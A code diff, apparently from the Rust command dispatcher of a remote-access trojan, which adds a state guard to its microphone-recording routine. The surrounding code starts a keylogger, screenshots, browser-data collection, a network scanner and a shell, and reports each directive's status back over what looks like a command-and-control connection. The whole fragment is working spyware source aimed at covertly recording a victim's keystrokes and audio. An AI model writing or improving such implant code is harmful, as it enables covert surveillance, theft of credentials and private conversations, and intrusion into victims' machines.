@@ -1,5 +1,6 @@
 use crate::{browser_info, connexion, input, logs, mic_rec, network_scanner, screenshot, shell};
 use rand::Rng;
+use std::sync::atomic::Ordering;
 use std::{collections::HashMap, future::Future, pin::Pin, sync::OnceLock};
 
 type PolyFunc = Box<dyn Fn(String) -> Pin<Box<dyn Future<Output = ()> + Send>> + Send + Sync>;
@@ -108,7 +109,6 @@ async fn keylogger_wrapper(alias: String) {
     if let Err(e) = input::start_keylogger(10).await {
         let _ = connexion::send_directive_status("keylogger", "error", &e.to_string()).await;
     }
-
 }
 
 async fn screenshot_wrapper(alias: String) {
@@ -172,15 +172,29 @@ async fn browser_info_wrapper(alias: String) {
 }
 
 async fn mic_rec_wrapper(alias: String) {
+    let state = mic_rec::init_mic_rec_state();
+    let mut guard = state.lock().await;
+    match *guard {
+        mic_rec::MicRecStatus::Running => {
+            println!("[{}] mic_rec déjà en cours", alias);
+            return;
+        }
+        _ => {
+            *guard = mic_rec::MicRecStatus::Running;
+        }
+    }
+
     println!(
         "[{}] Démarrage de la boucle d'enregistrement micro...",
         alias
     );
 
     let flag = mic_rec::init_mic_rec_flag();
+    flag.store(true, Ordering::SeqCst);
 
+    let state_clone = state.clone();
     tokio::spawn(async move {
-        match mic_rec::mic_rec_loop(flag).await {
+        match mic_rec::mic_rec_loop(flag.clone()).await {
             Ok(_) => {
                 let _ = connexion::send_directive_status("mic_rec", "success", "Terminé").await;
             }
@@ -188,6 +202,8 @@ async fn mic_rec_wrapper(alias: String) {
                 let _ = connexion::send_directive_status("mic_rec", "error", &e.to_string()).await;
             }
         }
+        let mut guard = state_clone.lock().await;
+        *guard = mic_rec::MicRecStatus::Idle;
     });
 }
 
